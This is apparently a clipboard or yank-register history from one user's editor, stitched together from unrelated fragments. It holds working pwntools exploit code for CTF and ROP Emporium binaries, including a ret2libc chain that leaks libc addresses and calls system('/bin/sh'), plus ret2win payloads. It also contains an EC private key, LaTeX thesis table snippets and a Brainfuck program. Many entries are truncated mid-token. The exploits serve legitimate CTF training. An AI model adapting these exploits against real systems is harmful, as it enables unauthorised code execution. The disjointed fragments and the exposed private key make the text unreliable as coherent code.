53cae98b054bb2938b95af58caff87f2|file:///home/neo/CTFs/ccsc2020/eclectic_dishonor/jwk-pem.js|5|36|v|javascript
	, {private: true}
adb4595bf2df489295c1fc9fd808ebd9|file:///home/neo/CTFs/ccsc2020/eclectic_dishonor/bob_priv.pem|7|1|V|
	-----BEGIN EC PRIVATE KEY-----
	MCUCAQEEIH9y4PoghPwVgbSdEQvWrpE2tY8O23el4H9eebJ99dQp
	-----END EC PRIVATE KEY-----
04c7f8111be158d11a3db8440a6de8e1|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|5|1|V|tex
	\subsection{}
65ea30d6e4e2dcd2014a24e68b7fda62|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/timings.txt|10|17|v|text
	30.9385 ms
bfb3254400dfcc748e7f60c8e561ef2c|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/timings.txt|11|19|v|text
	29.4657 ms
aa5e7a0cbdf7b0a9e894539650733199|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/timings.txt|12|27|v|text
	59.3584 ms
abc23bbeb0139f3d711b0bc1b88381e1|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|11|1|V|tex
	\usepackage{booktabs}
27913e9e6156f282d1587cd7f72f181a|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|14|10|v|tex
	Thicker horizontal lines above and below the table.
ada51345d28dddc66d4b3d89b4564dc6|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|28|1|V|tex
	Generate key pair                & 30.9385 ms \\
	Sign message                     & 29.4657 ms \\
	Generate key pair + sign message & 59.3584 ms
a05b2811ebe6a692ca83fc7703864442|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|22|1|V|tex
	John Smith&1&2\\
	Jane Doe&--&3\\
	Mary Johnson&4&5\\
175a134ead0175b344af7c856d98adba|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|26|1|V|tex
	\begin{table}[]\label{tab:generate_avg}
7c99d0193b25e32e41cca21c5dda9c67|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|16|1|V|tex
	\label{tab:generate_avg}
94607e6583cdeb942f4330a48224b33d|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|26|11|V|tex
	\begin{tabular}{ll}
	\end{tabular}
4947d667bc186854ce5dfcd7f22b7cd6|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|25|1|V|tex
	\end{table}
466cea6a029b365bbd57a7307e796964|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|10|1|V|tex
	% Please add the following required packages to your document preamble:
b72fab1c7ecabe8be8ae84fce0e5caf9|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|10|1|V|tex
	% \usepackage{booktabs}
9af6771d0fcaf7f8181c3c5ea5fb8a1d|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|12|1|V|tex
	\toprule
9e7303107ee1e856e9aad0dd7797a3c9|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|25|1|V|tex
	\midrule
87b593fb2f07e4a3291625a1c92af4f5|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|28|1|V|tex
	\bottomrule
c011af9888d97d910c895403416303bb|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|21|1|V|tex
	\centering
	\caption{Average time for generating key pairs and signatures}
808e83d389549a76a5fe6fa7f94004fa|untitled:1|30|1|V|sh
			experiment=`echo "iotlab-experiment submit -n $nameOfRun-sink$2_m$node -d $3 -l lille,m3,$nodesForward,ForwardingAlgorithmGrid_5_5.iotlab-m3 -l lille,m3,$node,$1.iotlab-m3 --site-association lille,script=aggregator_script" |sed  "s/,+/,/g" |sed "s/+,/,/g"`
2ce8edab38a00c234bb4abf5d4f3aaa6|untitled:1|30|1|V|sh
	        experiment=`echo "my_variable=$(iotlab-experiment submit -n $nameOfRun-sink$2_m$node -d $3 -l lille,m3,$nodesForward,ForwardingAlgorithmGrid_5_5.iotlab-m3 -l lille,m3,$node,$1.iotlab-m3 --site-association lille,script=aggregator_script)" |sed  "s/,+/,/g" |sed "s/+,/,/g"`
6b9d44730ec4f83d2f44299de0c6d410|file:///home/neo/CTFs/skeleton.py|3|25|V|python
	# This exploit template was generated via:
	# $ pwn template ./pie --host 192.168.10.125 --port 61337
815c5d96f0fda0224df73dbe7cd552c0|file:///home/neo/CTFs/skeleton.py|19|1|V|python
	    if args.GDB:
	        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	    else:
	        return process([exe.path] + argv, *a, **kw)
62c2c4af57e781cecd796e02d88beff5|file:///home/neo/CTFs/skeleton.py|16|1|V|python
	
	def local(argv=[], *a, **kw):
	    '''Execute the target binary locally'''
	
d34db7e1d26822b461e2c918d5b2e034|file:///home/neo/CTFs/skeleton.py|20|1|V|python
	    if args.GDB:
	        gdb.attach(io, gdbscript=gdbscript)
efab8a5b1bac45d1078321dc48fe934f|file:///home/neo/CTFs/skeleton.py|27|9|V|python
	        return remote(argv, *a, **kw)
f8c2e80c0aa0e5de0344670ea0eb79ac|file:///home/neo/CTFs/skeleton.py|26|9|V|python
	        return local(argv, *a, **kw)
ffa55a5afcdd2e4ea19648cdadd92413|file:///home/neo/CTFs/skeleton.py|29|18|V|python
	# Specify your GDB script here for debugging
	# GDB will be launched if the exploit is run via e.g.
	# ./exploit.py GDB
	gdbscript = '''
	tbreak main
	continue
	'''.format(**locals())
c3ae924da434c8498c7c5c99a701229f|file:///home/neo/CTFs/skeleton.py|45|1|V|python
	    # pie breakpoint put_pie+68
ea1397a78ef59d6dafcbe607b9ae19a1|file:///home/neo/CTFs/skeleton.py|43|5|V|python
	    # pie breakpoint put_pie+118
f766666ebe2828711c9090df7d6b2c7e|file:///home/neo/CTFs/skeleton.py|61|1|V|python
	MAIN_ADDR = BINARY_BASE_ADDR + exe.sym.main
	PUTS_PLT = BINARY_BASE_ADDR + exe.plt["puts"]
	PRINTF_GOT = BINARY_BASE_ADDR + exe.got["printf"]
16afdaefbd9e45d37635a626c04be7aa|file:///home/neo/CTFs/skeleton.py|61|1|V|python
	
	# Step 2: Leak the address of two libc functions and find the libc version
	FFLUSH_GOT = BINARY_BASE_ADDR + exe.got["fflush"]
	PUTS_GOT = BINARY_BASE_ADDR + exe.got["puts"]
	
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	payload = "A" * 40 + p32(PUTS_GOT - 0x18) +"AAAA"
	payload += p32(PUTS_PLT)
	payload += p32(MAIN_ADDR)
	payload += p32(PRINTF_GOT)
	io.sendline(payload)
	line = io.recvline_contains("Got this:")
	line = io.recvline()
	line = io.recv(4)
	PRINTF_LIBC = u32(line)
	log.info("Printf@libc: %#x" % PRINTF_LIBC)
	
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	payload = "A" * 40 + p32(PUTS_GOT - 0x18) +"AAAA"
	payload += p32(PUTS_PLT)
	payload += p32(MAIN_ADDR)
	payload += p32(FFLUSH_GOT)
	io.sendline(payload)
	line = io.recvline_contains("Got this:")
	line = io.recvline()
	line = io.recv(4)
	FFLUSH_LIBC = u32(line)
	log.info("Fflush@libc: %#x" % FFLUSH_LIBC)
fc99d6b63fc38d03edbf8209b956f4a2|file:///home/neo/CTFs/skeleton.py|62|1|V|python
	# Step 3: Call system() to spawn /bin/sh
df147b716ef4023d0d5110527645d39c|file:///home/neo/CTFs/skeleton.py|65|1|V|python
	SYSTEM_OFFSET = libc.sym.system
105052050ece9996af0f26283c726922|file:///home/neo/CTFs/skeleton.py|47|1|V|python
	# Step 1: Leak print_pie address and calculate base address of binary
	MAIN_ADDR = BINARY_BASE_ADDR + exe.sym.main
	PUTS_PLT = BINARY_BASE_ADDR + exe.plt["puts"]
	PRINTF_GOT = BINARY_BASE_ADDR + exe.got["printf"]
	log.info("Print pie offset: %#x" % PRINT_PIE_OFFSET)
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	io.sendline("A" * 31)
	line = io.recvline_contains("Got this:")
	leaked = io.recvline()
	print_pie_addr = u32(leaked[:4])
	log.info("Print pie addr: %#x" % print_pie_addr)
	BINARY_BASE_ADDR = print_pie_addr - PRINT_PIE_OFFSET
	log.info("Binary base addr: %#x" % BINARY_BASE_ADDR)
aedd3e73ce902f8872cea2170a9f33cc|file:///home/neo/CTFs/skeleton.py|47|1|V|python
	
	# libc = ELF("./libc-2.23.so")
7604021cc2509c034370faa582cc9052|file:///home/neo/CTFs/skeleton.py|49|1|V|python
	
	LIBC_BASE = PRINTF_LIBC - libc.sym.printf
	BINSH_ADDR = LIBC_BASE + next(libc.search('/bin/sh\x00')) 
	SYSTEM_ADDR = LIBC_BASE + libc.sym.system
	log.info("system@libc: %#x" % SYSTEM_ADDR)
	log.info("binsh@libc: %#x" % BINSH_ADDR)
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	payload = "A" * 48
	payload += p32(SYSTEM_ADDR)
	payload += "BBBB"
	payload += p32(BINSH_ADDR)
	io.sendline(payload)
	line = io.recvline()
32fcb54b51587e8fdcb71bad43b54844|file:///home/neo/ccsc/pie/exploit.py|71|1|V|python
	if args.PWNDBG:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
	    piebase 0x7f0
	    ''')
2ae49911f6665f2afff6281e73109464|file:///home/neo/CTFs/skeleton.py|48|5|V|python
	    piebase 0x7f0
a9f8641fa56ebcc144c1e0381e0ed2b6|file:///home/neo/CTFs/skeleton.py|33|4|v|python
	rch:     i386-32-little
9f8d347dfc45fe1666f8d85f1d025c68|file:///home/neo/CTFs/skeleton.py|33|1|V|python
	# Ajj
	# RELRO:    Full RELRO
	# Stack:    No canary found
	# NX:       NX enabled
	# PIE:      PIE enabled
8290ed2495950dd18c190f996c41cb8d|file:///home/neo/ropemporium/ret2win32/exploit.py|48|25|V|python
	# SYSTEM_OFFSET = libc.sym.system
	# libc = ELF("./libc-2.23.so")
d3f7c0c69a021e640fa1f21e5fed558e|file:///home/neo/ropemporium/ret2win32/exploit.py|39|1|V|python
	RET2WIN_ADDR = 0x08048659
ae2f1977db21f130254e6963b23c980d|file:///home/neo/ropemporium/ret2win32/exploit.py|49|1|V|python
	# Ad
bb35850e1d54557ff754b2a8184f3ac0|file:///home/neo/ccsc/pie/exploit.py|18|1|V|python
	
	def local(argv=[], *a, **kw):
85c4c048cb4883a3cc5a452b62def36f|file:///home/neo/ccsc/pie/exploit.py|19|1|V|python
	def local(argv=[], *a, **kw):
	    return process([exe.path] + argv, *a, **kw)
27c1bd3c06485aa808c20b841322aa35|file:///home/neo/ropemporium/ret2win32/exploit.py|56|13|v|python
	u32(RET2WIN_ADDR)
667d90ccb160d7272d76b212f6e52a8e|file:///home/neo/CTFs/notes/pwn|2|1|V|
	rabin2 -z fluff
631186ade4baff8fb16c7bb3ca1f70b3|file:///home/neo/CTFs/notes/pwn|5|1|V|
	rabin2 -qs <binary> | grep -ve imp -e ' 0 '
a4fdeccdcaa56d5344af51cd453dd01b|file:///home/neo/ccsc/skeleton.py|32|1|V|python
	OFFSET = cyclic_find(0xdeadbeef)  # cyclic(1024)
f04cba3fab5230829c2ba0b16ccba274|file:///home/neo/ropemporium/ret2win32/exploit.py|55|1|V|python
	pattern = cyclic(1024)
240bf022e685b0ee30ad9fe9e1fb5d5b|file:///home/neo/ropemporium/ret2win32/exploit.py|55|13|v|python
	pattern
43966540366c1b960ce8033cee730991|file:///home/neo/ropemporium/ret2win32/exploit.py|59|22|V|python
	# line = io.recvline()
	# log.info("Received: %s" %  line)
1a7c011b3d9e460223e7906aa986169e|file:///home/neo/ropemporium/ret2win32/exploit.py|14|22|v|python
	192.168.10.125
4880ae0c619c185fc7611dbe70f424c9|file:///home/neo/ropemporium/ret2win32/exploit.py|15|25|v|python
	61337
a739a2a5770639d8d50fb5d4f2b7ce60|file:///home/neo/ropemporium/ret2win32/exploit.py|9|1|V|python
	# Many built-in settings can be controlled on the command-line and show up
	# in "args".  For example, to dump all data sent/received, and disable ASLR
	# for all created processes...
	# ./exploit.py DEBUG NOASLR
	# ./exploit.py GDB HOST=example.com PORT=4141
7a86c157ee9713c34fbd7a1ee40f0c5a|file:///home/neo/ropemporium/ret2win/exploit.py|52|25|v|python
	offset
a71ce809c98590a7ba61d0dc5afe0798|file:///home/neo/ropemporium/ret2win/exploit.py|51|1|V|python
	OFFSET = cyclic_find(0x6161616b)
1b8a8605d2ff5670a215e55c6645e0d9|file:///home/neo/ropemporium/ret2win/exploit.py|54|1|v|python
	OFFSET
c83e1c708c65622c114dac302ef55926|file:///home/neo/ropemporium/ret2win/exploit.py|52|1|V|python
	log.info("Offset: %s" % OFFSET)
dfd0a82c4bf37b1e90b690a22a20692e|file:///home/neo/ropemporium/ret2win/exploit.py|54|11|v|python
	Offset
e37ec50deee229cfc5d0c664c76a66a2|file:///home/neo/ropemporium/ret2win/exploit.py|53|25|v|python
	 p64(RET2WIN_ADDR)
767358a2d649465d2a85965ef66ec7cc|file:///home/neo/ropemporium/ret2win/exploit.py|53|31|v|python
	RET2WIN_ADDR
b7fab03efd098593e78d59f421121f22|file:///home/neo/ropemporium/ret2win/exploit.py|48|1|V|python
	PWNME_ADDR = 0x004007b5
510514ea3f1bc5d7183f4bb68f02df40|file:///home/neo/ropemporium/ret2win/exploit.py|53|31|v|python
	PWNME_ADDR
6c63de8a3edffcb84519377b82465f1d|file:///home/neo/ropemporium/ret2win/exploit.py|53|33|v|python
	TS_ADDR) + p64(RET2WIN_ADDR) + 16 * "A"
ae9a19171fa0f75c3f0b3fab96e19723|file:///home/neo/ropemporium/ret2win/exploit.py|57|1|V|python
	payload = "A" * OFFSET +  p64(GADGET_ADDR) + p64(RET2WIN_ADDR)
85fad112c41ed402c6cc90a1e1b3db30|file:///home/neo/ropemporium/ret2win/exploit.py|58|27|v|python
	p64(GADGET_ADDR) 
05e2343c142e67626e44937d09672d00|file:///home/neo/ropemporium/ret2win/exploit.py|58|1|V|python
	payload = "A" * OFFSET + p64(RET2WIN_ADDR)
ef0582f7da0f13860556e03a37a8a14f|file:///home/neo/ropemporium/ret2win/exploit.py|57|1|V|python
	payload = "A" * OFFSET +  p64(RET_GADGET_ADDR) + p64(RET2WIN_ADDR)
aaae0d7a1ea1a64ca6e32d3cd2122322|file:///home/neo/ropemporium/ret2win/exploit.py|58|31|v|python
	RET_GADGET_ADDR
e18eae80084eb5e287c7e5ddf8f11684|file:///home/neo/ropemporium/ret2win/exploit.py|59|31|v|python
	exe.sym.memset
318c86c982c77c1ddea8438195f4c055|file:///home/neo/CTFs/notes/pwn|13|1|V|
	rabin2 -z <binary>
7e6bd2bc50b5740232023de97cc2f6b8|file:///home/neo/CTFs/tamu2020/getting-confused/skeleton.py|49|1|V|python
	# io.sendline(cyclic(1024))
aacb8af6e579b56e77438b8464061a8c|file:///home/neo/CTFs/tamu2020/getting-confused/skeleton.py|49|1|V|python
	OFFSET = cyclic_find(0x6161616c)
77279341fd3cab92c937ee6355a0e79e|file:///home/neo/CTFs/tamu2020/getting-confused/skeleton.py|49|1|V|python
	payload = "A" * OFFSET + p32(RET2WIN_ADDR)
241bcbd92a85c44052798c5f0f37f9f4|file:///home/neo/CTFs/tamu2020/getting-confused/skeleton.py|48|1|V|python
	io.recvuntil('Howdy! First floor.')
f610f0419777e55187d84ac736d0a486|file:///home/neo/CTFs/tamu2020/getting-confused/skeleton.py|50|15|v|python
	Howdy! First floor.
4b1f175e90e558fabb5c77432bab114e|file:///home/neo/CTFs/tamu2020/getting-confused/skeleton.py|49|1|V|python
	io.sendline("howdy")
0782efd61b7a6b02e602cc6a11673ec9|file:///home/neo/CTFs/tamu2020/getting-confused/skeleton.py|51|14|v|python
	howdy
8241a6a38230a55e96861b33f3346470|file:///home/neo/CTFs/tamu2020/getting-confused/skeleton.py|50|1|V|python
	io.recvuntil('Thanks and...')
4a40e894d59b9087fbaef064a4824b4f|file:///home/neo/CTFs/tamu2020/getting-confused/skeleton.py|52|15|v|python
	Thanks and...
37111c2ed0c32e8c226292e2f24ca408|file:///home/neo/CTFs/tamu2020/getting-confused/skeleton.py|53|1|V|python
	What's our secret way of knowing when another one of us is in a crowd?
e51ac3046a9ac953255c51af093d6425|file:///home/neo/CTFs/tamu2020/getting-confused/skeleton.py|51|1|V|python
	io.sendline("gig 'em'")
d63a94aa825a88f04488085d4ed8911b|file:///home/neo/CTFs/tamu2020/getting-confused/exploit.py|6|31|v|python
	ret2win32
93341f66f08e4065acea677866d01d2c|file:///home/neo/CTFs/tamu2020/getting-confused/exploit.py|39|21|v|python
	ut_pie+118
07e543578e4d4a498620337842dade22|file:///home/neo/CTFs/tamu2020/getting-confused/exploit.py|53|17|v|python
	0x7fffffffdc50
8675b44027597f1a6879e14cff330cbc|file:///home/neo/CTFs/tamu2020/getting-confused/exploit.py|54|1|V|python
	0x7ffde4d13190
ab95a9d704f89b3ff10a7a4e94a19d90|file:///home/neo/CTFs/tamu2020/getting-confused/exploit.py|53|17|v|python
	0x0000000000000000
85a9a4ce72dc6af35400a3af7c3e9013|file:///home/neo/CTFs/tamu2020/getting-confused/exploit.py|45|5|V|python
	    # piebase 0x7f0
255e3f7fe7ecb7300fa529e142d159b0|file:///home/neo/CTFs/tamu2020/getting-confused/exploit.py|44|12|v|python
	 0x7f0
1848596092833b2e50d7b74819980603|file:///home/neo/CTFs/tamu2020/getting-confused/exploit.py|54|1|V|python
	io.sendline("A" * 64)
0beb35a1f79fa544f5b05fcb2441703f|file:///home/neo/CTFs/tamu2020/getting-confused/exploit.py|54|1|V|python
	io.send(chr(tty.CEOF))
6d2aee40da8c647566d7e9183f1477c6|file:///home/neo/CTFs/tamu2020/getting-confused/exploit.py|13|1|V|python
	def local(argv=[], *a, **kw):
	    return process([exe.path] + argv, stdin=PTY, raw=False)
324f2d27b1441d41ec8f3da0a1a6f5f8|file:///home/neo/CTFs/tamu2020/getting-confused/exploit.py|1|1|V|python
	#!/usr/bin/env python
	# -*- coding: utf-8 -*-
	from pwn import *
	import tty
	
	# Set up pwntools for the correct architecture
	exe = context.binary = ELF('./getting-confused')
	context.terminal = ['tmux', 'splitw', '-h']
	
	host = args.HOST or 'challenges.tamuctf.com'
	port = int(args.PORT or 4352)
	
	def local(argv=[], *a, **kw):
	    return process([exe.path] + argv, stdin=PTY, raw=False)
	
	def remote(argv=[], *a, **kw):
	    '''Connect to the process on the remote host'''
	    io = connect(host, port)
	    return io
	
	def start(argv=[], *a, **kw):
	    '''Start the exploit against the target.'''
	    if args.REMOTE:
	        return remote(argv, *a, **kw)
	    else:
	        return local(argv, *a, **kw)
	
	
	#===========================================================
	#                    EXPLOIT GOES HERE
	#===========================================================
	
	# SYSTEM_OFFSET = libc.sym.system
	# libc = ELF("./libc-2.23.so")
	
	io = start()
	
	if args.GEF:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
	    pie breakpoint main+395
	    ''')
	
	if args.PWNDBG:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
	    piebase
	    ''')
	
	
	io.recvuntil('Howdy! First floor.')
	io.sendline("howdy")
	io.recvuntil('Thanks and...')
	io.sendline("gig 'em")
	io.recvuntil("What's our secret way of knowing when another one of us is in a crowd?")
	io.send(chr(tty.CEOF))
	io.recvline()
	
	io.interactive()
	
d8f69cbfbd34614d32be520e4b72ba3b|file:///home/neo/CTFs/tamu2020/getting-confused/flag.txt|1|1|V|text
	ivresto
fff473b1e88b8a9d1982d831402761dc|file:///home/neo/CTFs/skeleton.py|47|1|V|python
	io.recvuntil('>')
fdcdf1af8b2b919d0c7e3745d14477af|untitled:1|1|1|V|
	a>+++[>+++[<<+++++>>-]<-]<++.>>+++++[>+++++[<<++++>>-]<-]<.>>+++++[>+++++[<<++++>>-]<-]<+.>>++++[>+++++[<<++++++>>-]<-]<--.>>+++[>+++[<<+++++>>-]<-]<++.>>+++++[>+++++[<<+++++>>-]<-]<----------.[>+>+<<-]>>[-<<+>>]<+.>>+++++[>+++++[<<++++>>-]<-]<.>>++++[>+++++[<<++++++>>-]<-]<---------.>>++++[>+++++[<<++++++>>-]<-]<---.>>+++++[>+++++[<<+++++>>-]<-]<---------.>/>>+++[>+++[<<+++++>>-]<-]<++.>>+++++[>+++++[<<++++>>-]<-]<.>>+++++[>+++++[<<++++>>-]<-]<+.>>++++[>+++++[<<++++++>>-]<-]<--./>>+++[>+++[<<+++++>>-]<-]<++.>>+++++[>+++++[<<+++++>>-]<-]<----------.[>+>+<<-]>>[-<<+>>]<+.>>+++++[>+++++[<<++++>>-]<-]<.>>++++[>+++++[<<+++++>>-]<-]<+++++.>>++[>+++++[<<+++++++++++>>-]<-]<.>/>>+++[>+++[<<+++++>>-]<-]<++.>>++++[>+++++[<<++++++>>-]<-]<--------.>>+++++[>+++++[<<+++++>>-]<-]<-----------.>>++++[>+++++[<<++++++>>-]<-]<---------.>>+++++[>+++++[<<++++>>-]<-]<-./>>+++[>+++[<<+++++>>-]<-]<++.>>++++[>+++++[<<++++++>>-]<-]<---.>>++++[>+++++[<<++++++>>-]<-]<--------.>>+++++[>+++++[<<+++++>>-]<-]<---------.>>++++[>+++++[<<+++++>>-]<-]<+++++.>>++[>+++++[<<+++++++++++>>-]<-]<-.>>+++++[>+++++[<<++++>>-]<-]<+.>[-]>++++++++++.<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<[>>>>>>>>>>>>~~>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>,,,,[-]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<~~>>>>>>>>>>>>>>>>>>>>>>>~~>>>>>>>>>>>>>>>>>>>>()[-]>[-]>[-]>[-]>[-]>[-]>[-]>[-]>[-]>[-]>[-]>[-]>[-]>[-]<<<<<<<<<<<<<()+[,>[-]>[-]>[-]<<<>>+++[>++++[<<++++>>-]<-]<--[-<->]>>>+<<<<]>>>>---:<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>~~>>>>>>>>>>>>>>>>>>>>>>>>[<,[-]>-]<<,>,>>>+++[>++++[<<++++>>-]<-]<[-<+>]<[-<-<->>]<<<++++++++++[>[<<+<+>>>-]<<[>>+<<-]>-]>[-]<<[-]<>>>>[-<<<<+>>>>]<<<<<<<<<>[-]<[->+<]>>>>>[-<<<<<+>>>>>]<<<<<[->>>>>>+>+<<<<<<<]>>>>>>[-<<<<<<+>>>>>>]<<<<<[->>>>+>+<<<<<]>>>>[-<<<<+>>>>]>[->-<]<----------------[->+>-[>+>>]>[+[-<+>]>+>>]<<<<<<]:%%/[-]>[-]>[-]>[-]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<~~>>>>>>>>>>>>>>>>>>>>>>>()>>>>>>>>>>>>>>>>>>>>>>>[->>>>>>>>+>+<<<<<<<<<]>>>>>>>>[-<<<<<<<<+>>>>>>>>]>>>+++++[>+++++[<<++++>>-]<-]<<<^>>>[-]>[-]<<<<[-]>[>>+<[->[-]>+<<]>[-<<<+>>>]>[-<<+>>]<<-<-]>[-]>[-]<<<[<<<<<<>+++++[>+++++[<<++++>>-]<-]<<<[->+>-[>+>>]>[+[-<+>]>+>>]<<<<<<]:%%/>>>>>>+++[>++++[<<++++>>-]<-]<[-<+>]<.[-]<<[-]<[-]>>[-<<<+>>>]>>>>>[-]]<<<<<<<<[->>>>>>>+>+<<<<<<<<]>>>>>>>[-<<<<<<<+>>>>>>>]>>++++++++++<<^>>>[-]>[-]<<<<[-]>[>>+<[->[-]>+<<]>[-<<<+>>>]>[-<<+>>]<<-<-]>[-]>[-]<<<[[-]<<<<<++++++++++<<[->+>-[>+>>]>[+[-<+>]>+>>]<<<<<<]:%%/>>>>>>+++[>++++[<<++++>>-]<-]<[-<+>]<.[-]<<[-]<[-]>>[-<<<+>>>]>>>>>]<<<<<<+++[>++++[<<++++>>-]<-]<[-<+>]<.[-][-]++++++++[>++++<-]>.[-]#++++++[>+++++++++++<-]>.[-]++++++++[>++++++++++<-]>.[-][-]+++++++[>+++++++++++<-]>.#<<<<<<<<<<<<<<.#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<]
3a7d3517bc9858c3f7b240ea607da935|untitled:1|1|25|v|
	Write code 60 (sys exit) in cell1
feaa77165bc81a8c28b258b50cf08a63|untitled:1|1|25|v|
	move to cell2
06b0c7c00544e5371aa7abdf0b548b1c|untitled:1|1|24|v|
	                       Write argument count of 1 to cell2
689879ed2a4dd3f8e50cd10371e5fbdf|untitled:1|1|23|v|
	  Write code 60 (sys exit) in cell1
4abe0ddd2c891bb715fff4918e76b94d|untitled:1|2|2|v|
	                       move to cell2
fa228405cbe081bc2a61c1b087c74648|untitled:1|4|2|v|
	                       move to cell3
cf1955b87649df9d1e7e33a73f53559e|untitled:1|5|1|v|
	(leave 0)               Write first arg type as normal
9b3af9b0ec4596a8249d96b0ab37b2fb|untitled:1|5|2|v|
	                       move to cell4
2b5781748d168fa9c76f73af4bd05ba5|untitled:1|6|2|v|
	                       Write first arg cell length of 1 to cell3
5924dbd63af38265aec13a35c35685ad|untitled:1|7|2|v|
	                       move to cell5
f076cd057800618b99f5b2ca16e59704|untitled:1|8|4|v|
	                     Write exit code 3 in cell4
b8726bb74b36705665a8abfd686b4566|untitled:1|9|5|v|
	                    move back to cell1
a070b385380f161990d9517861d5ff21|file:///home/neo/bfexit|1|1|V|
	++++++[>++++++++++<-]>>+>>+>+++<<<<%  
c363bc415a64052b18a2a41bfb4bacc2|file:///home/neo/ropemporium/ret2win/exploit.py|60|1|V|python
	payload = "A" * OFFSET +  p64(MAIN_RET) + p64(RET2WIN_ADDR)
a3ec3961428df9c930ab151adbba86df|file:///home/neo/ropemporium/ret2win/exploit.py|50|1|V|python
	MAIN_RET = 0x00000000004007b4
d56216c1e94549aba216c55157647b3e|file:///home/neo/ropemporium/ret2win/exploit.py|58|1|V|python
	# payload = "A" * OFFSET +  p64(RET_GADGET_ADDR) + p64(RET2WIN_ADDR)
598e12aa0028043564d97c78074a2ac8|file:///home/neo/ropemporium/ret2win/exploit.py|59|23|v|python
	 +  p64(RET_GADGET_ADDR) + p64(RET2WIN_ADDR)
ce08a5bc124967a8b9256493a8ebebbc|file:///home/neo/ropemporium/ret2win/exploit.py|60|11|v|python
	ayload length
dd97687aab1a37cec86a01ec97c6b823|file:///home/neo/ropemporium/ret2win/exploit.py|60|1|V|python
	# payload = "A" * 100
76e76bcd8df985d97ab9cafc046e5473|file:///home/neo/ropemporium/ret2win/exploit.py|59|23|v|python
	 p64(RET_GADGET_ADDR) 
d12d33aae61056821cb479667d010dcb|file:///home/neo/ropemporium/ret2win/exploit.py|49|1|V|python
	PUTS_ADDR = 0x004005d0
5686356548e401e28a89b282970305c6|file:///home/neo/ropemporium/ret2win/exploit.py|49|1|V|python
	
	rop = ROP(exe)
	gadget = rop.find_gadget(["ret"])
	RET_GADGET_ADDR = gadget.address
1c8a7ff41fa82b2c95ead02850c1fdcd|file:///home/neo/ropemporium/ret2win/exploit.py|53|1|V|python
	# Add 4 to the address to skip the push instruction at the beginning of the function and keep the stack 16-byte aligned
eafe11954f52a2705fb34c225e79c805|file:///home/neo/CTFs/skeleton.py|49|11|v|python
	"A" * OFFSET 
58adb3f49e4ab36d498bebab12709fd4|file:///home/neo/ropemporium/split32/exploit.py|50|25|v|python
	"target"
e9b883b6db7d6dcc2821c2d343066562|file:///home/neo/ropemporium/split32/exploit.py|51|1|V|python
	payload = fit({OFFSET-8:}, filler="A")
10439f04e64fb36fe035030df281b8dc|file:///home/neo/ropemporium/split32/exploit.py|53|1|V|python
	# payload = fit({OFFSET-8:p32(SYSTEM_ADDR), OFFSET:p32(CAT_FLAG_ADDR)}, filler="A")
c54af384e2f32c86e82a42d8fae993e9|file:///home/neo/ropemporium/split32/exploit.py|54|16|v|python
	OFFSET-8:p32(SYSTEM_ADDR),
f2dde88908adb93e6e4c30214ca35caa|file:///home/neo/ropemporium/split32/exploit.py|55|1|V|python
	payload = fit({OFFSET:p32(CAT_FLAG_ADDR)})
460bc2aaec3c79895f2def04c9789582|file:///home/neo/ropemporium/split32/exploit.py|56|3|^v|python
	Old return address location: 
221c1f031003584b324ab705f0113625|file:///home/neo/CTFs/skeleton.py|31|1|V|python
	
	# SYSTEM_OFFSET = libc.sym.system
	# libc = ELF("./libc-2.23.so")
30371bac27321a23e6629c8f4a08058c|file:///home/neo/ropemporium/split/exploit.py|56|24|v|python
	CAT_FLAG_ADDR
8024870017f09c954f38f05b81fdb9e9|file:///home/neo/ropemporium/split/exploit.py|56|24|v|python
	GADGET_ADDR
6d7dd96d1326fb6c4bf125626e6a8ae6|file:///home/neo/ropemporium/split/exploit.py|50|1|V|python
	GADGET_ADDR = POP_RDI_GADGET.address
51360efc75f9458b6cd49b9fe32268d4|file:///home/neo/ropemporium/split/exploit.py|51|1|V|python
	GADGET2_ADDR = RET_GADGET.address
819b7d654925e0acb7276019715beaf5|file:///home/neo/ropemporium/split/exploit.py|58|27|v|python
	GADGET2_ADDR
457bde6cc7e38203ab81553406de7dfe|file:///home/neo/ropemporium/callme32/exploit.py|44|1|V|python
	CALL_ME_ONE_PLT = exe.plt.callme_one
